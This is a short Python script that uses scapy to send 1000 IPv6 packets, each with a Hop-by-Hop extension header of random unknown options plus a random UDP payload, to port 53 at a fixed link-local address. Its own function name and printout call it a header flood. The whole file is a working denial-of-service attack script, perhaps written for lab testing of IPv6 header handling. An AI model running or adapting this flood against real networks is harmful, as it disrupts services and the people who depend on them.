import binascii
from scapy.all import *
from scapy.layers.inet import UDP
from scapy.layers.inet6 import IPv6

number_packets = 1000
destination = "fe80::a00:27ff:fe4c:1052"
s_port = 1055
d_port = 53


def hop_opt_flood():
    print("Hop by Hop header flood")
    # using a RandString() of length 36 because else another HBH header is appended for padding reasons
    packets = IPv6(dst=destination) / IPv6ExtHdrHopByHop(options=HBHOptUnknown(optdata=RandString(36))) / UDP(
        sport=s_port, dport=d_port) / Raw(load=RandString(100))
    packets.show()

    send(packets, count=int(number_packets))


hop_opt_flood()
